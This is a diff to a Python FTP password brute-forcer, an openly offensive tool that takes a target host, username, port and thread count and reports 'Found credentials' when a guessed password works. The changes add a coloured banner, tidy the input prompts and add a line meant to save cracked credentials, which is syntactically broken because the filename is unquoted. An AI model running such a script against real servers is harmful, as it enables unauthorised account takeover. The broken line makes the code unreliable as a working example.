@@ -21,22 +21,23 @@ import queue
 from colorama import Fore, init #for fancy colors,nothing else
 import sys
 import time
+from termcolor import colored
 
+try:
+	 import pyfiglet ; banner=pyfiglet.figlet_format("FTP-BRUTE")
+except:
+	print("Failed to detect pyfiglet.\n","Install pyfiglet\n") ; banner="FTP-BRUTE"
+	
+print(colored(banner,"red"))	
+print(colored("FTPBrute Script.","blue"))
+print(colored("Written By GiddySpurz.","blue"))
+print(colored("For Educational Purposes Only.","blue"))
 
-print("FTPBrute Script")
-print("Written By GiddySpurz")
-print("For Educational Purposes Only.")
-
-
+host = input("Input Host: ")
+username = input("Input Username: ")
+port = int(input("Enter The Port: (Default FTP Port 21)"))
+n_threads = int(input("n_threads: (Number of Threads,Use 10)"))
 q = queue.Queue()
-print("Input Host: ")
-host = input()
-print("Input Username: ")
-username = input()
-print("Enter The Port: (Default FTP Port 21)")
-port = int(input())
-print("n_threads: (Number of Threads,Use 10)")
-n_threads = int(input())
 
 def connect_ftp():
 	global q
@@ -53,6 +54,7 @@ def connect_ftp():
 			print(e)
 		else:
 			print(f"{Fore.GREEN}[+]Found credentials: ")
+			file = open(Found credentials.txt, "w")
 			print(f"\tHost: {host}")
 			print(f"\tUser: {user}")
 			print(f"\tPassword: {password}{Fore.RESET}")
